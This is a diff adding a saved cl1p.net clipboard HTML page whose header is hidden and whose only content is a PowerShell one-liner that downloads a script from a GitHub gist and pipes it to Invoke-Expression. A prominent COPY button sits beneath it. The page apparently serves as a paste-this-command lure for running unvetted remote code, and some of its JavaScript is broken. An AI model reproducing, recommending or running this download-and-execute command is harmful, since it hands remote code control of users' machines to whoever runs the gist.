@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <!-- Google tag (gtag.js) -->
+    <!--<script async="" src="./cl1p.net - The internet clipboard_files/js"></script> -->
+    <!--<script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-YG43LG3PGY');
+    </script> -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- <title>cl1p.net - The internet clipboard</title>
+    <link href="./cl1p.net - The internet clipboard_files/global.css" rel="stylesheet">
+    <script src="./cl1p.net - The internet clipboard_files/cl1phelper.js"></script> -->
+</head>
+<body onload="go()">
+
+
+<div class="wrapperStyle" >
+    <div id="desktopHeader" style="visibility:hidden">
+    <div style="float:left"><a href="https://cl1p.net/">cl1p.net - The internet clipboard</a>&nbsp;
+    </div>
+        <div style="float:right">
+            
+            <a class="loginSignUp" href="https://cl1p.net/sys/login.jsp">Login/Sign Up</a>
+            
+            cl1p.net/acoffice
+        </div>
+        <div style="clear:both"></div>
+    </div>
+    <div id="mobileHeader" style="visibility:hidden">
+        <div>cl1p.net/acoffice 
+        </div>
+        <div>
+        </div>
+        <div style="float:right">
+            
+            <a class="loginSignUp" href="https://cl1p.net/sys/login.jsp">Login/Sign Up</a>
+            
+        </div>
+        <div style="clear:both"></div>
+    </div>
+
+
+
+
+
+
+
+<!--<script src="./cl1p.net - The internet clipboard_files/cl1phelper.js"></script> -->
+<script type="text/javascript">
+function copyToClipboard() {
+    var copyText = document.querySelector("#cl1pTextArea");
+    copyText.select();
+    document.execCommand("copy");
+}
+
+function keepActive() {
+    var keepBtn = document.getElementById("keepActive");
+    keepBtn.disabled = true;
+    let currentUriEle = document.getElementById("currentUri");
+    let path = null;
+    if(currentUriEle)
+    {
+        path = currentUriEle.value;
+    }else{
+        console.log("Can't find current path");
+        return;
+    }
+    var clipWrite = {
+        content: window.content.value,
+        path: path
+    };
+    var request = new XMLHttpRequest();
+    request.open('PUT', '/sys/rest/write');
+    request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    request.onload = function () {
+        var btn = document.getElementById("keepActive");
+        btn.innerText = "Kept";
+    };
+    request.send(JSON.stringify(clipWrite));
+}
+
+
+window.onload = function() {
+
+    let linkDetectedBtn = document.getElementById("linkDetectedBtn");
+    if (linkDetectedBtn) {
+        linkDetectedBtn.addEventListener("click", () => {
+
+            let linkContent = document.getElementById("cl1pTextArea").value;
+            window.location.href =  "" +  linkContent + "";
+        });
+    }
+
+    let copyToClipboardBtn = document.getElementById("copyToClipboardBtn");
+    if(copyToClipboardBtn)
+    {
+        copyToClipboardBtn.addEventListener("click", copyToClipboard);
+    }
+
+    let keepActive = document.getElementById("keepActive");
+    if(keepActive)
+    {
+        keepActive.addEventListener("click", )
+    }
+
+};
+</script>
+<div class="line"></div>
+
+<div class="statusLine" ><!--<span>This cl1p will be deleted in in 30 days.</span>-->
+    
+    
+</div>
+<div class="contentRead" id="target" >
+        <textarea id="cl1pTextArea" name="content" style="width:100%;">powershell -Command "iwr -Uri 'https://gist.githubusercontent.com/doteater/89dcfb049425c084c0b6c81755a314ac/raw' | iex"</textarea>
+        
+</div>
+
+<!-- <button id="copyToClipboardBtn">Copy</button> -->
+
+<br><br>
+<button
+  id="copyToClipboardBtn"
+  role="button"
+  style="
+    align-items: center;
+    appearance: none;
+    background-color: #fff;
+    border-radius: 24px;
+    border-style: none;
+    box-shadow: rgba(0, 0, 0, .2) 0 3px 5px -1px, rgba(0, 0, 0, .14) 0 6px 10px 0, rgba(0, 0, 0, .12) 0 1px 18px 0;
+    box-sizing: border-box;
+    color: #3c4043;
+    cursor: pointer;
+    display: inline-flex;
+    fill: currentcolor;
+    font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    font-size: 14px;
+    font-weight: 500;
+    height: 48px;
+    justify-content: center;
+    letter-spacing: .25px;
+    line-height: normal;
+    max-width: 100%;
+    overflow: visible;
+    padding: 2px 24px;
+    position: relative;
+    text-align: center;
+    text-transform: none;
+    transition: box-shadow 280ms cubic-bezier(.4, 0, .2, 1), opacity 15ms linear 30ms, transform 270ms cubic-bezier(0, 0, .2, 1) 0ms;
+    user-select: none;
+    -webkit-user-select: none;
+    touch-action: manipulation;
+    width: auto;
+    will-change: transform, opacity;
+    z-index: 0;
+  "
+>
+  COPY
+</button>
+
+</div>
+<script>
+    function go(){}
+</script>
+
+
+
+</body></html>
